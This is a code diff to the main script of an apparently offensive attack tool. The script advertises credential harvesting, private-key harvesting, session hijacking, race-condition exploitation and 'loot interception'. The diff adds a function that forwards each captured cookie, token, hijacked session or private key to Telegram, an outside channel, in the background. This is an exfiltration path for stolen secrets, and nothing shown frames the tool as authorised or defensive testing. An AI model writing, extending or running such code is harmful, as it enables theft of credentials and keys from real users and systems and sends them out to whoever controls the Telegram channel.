@@ -7,6 +7,7 @@ Main Orchestrator:
 - Source intelligence & credential exposure parsing
 - Autonomous state-machine mapping, BOLA auditing, and HTTP/2 race condition exploitation
 - Live terminal streaming with zero-disk memory persistence & real-time loot interception
+- Integrated with asynchronous Telegram telemetry delivery
 """
 import asyncio
 import sys
@@ -32,6 +33,9 @@ from modules.dumper import harvest_email_intelligence
 from modules.keyharvester import harvest_private_keys
 from modules.stealth_ops import run_stealth_engine
 from modules.live_login_verifier import execute_live_login_verification
+
+# Import Telegram Notifier Dispatcher
+from modules.telegram_notifier import send_telegram_alert
 
 # ============================================================
 # TERMINAL COLORS & LOOT HIGHLIGHTS
@@ -82,7 +86,8 @@ def display_progress(message):
 def alert_loot(loot_type, details):
     """
     Real-time on-the-fly loot notification banner for high-value discoveries 
-    (hijacked sessions, created accounts, cookies, secret tokens, private keys).
+    (hijacked sessions, created accounts, cookies, secret tokens, private keys)
+    + Dispatches asynchronous Telegram alerts.
     """
     print(f"\n{LOOT_YELLOW}{BOLD}[!!!] CRITICAL LOOT DISCOVERED: {loot_type.upper()} [!!!]{RESET}")
     print(f"{LOOT_PURPLE}-----------------------------------------------------------------")
@@ -92,6 +97,13 @@ def alert_loot(loot_type, details):
     else:
         print(f"  {details}")
     print(f"{LOOT_PURPLE}-----------------------------------------------------------------{RESET}\n", flush=True)
+
+    # Trigger non-blocking Telegram delivery
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        asyncio.run(send_telegram_alert(loot_type, details))
 
 # ============================================================
 # TARGET VALIDATION
@@ -381,4 +393,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
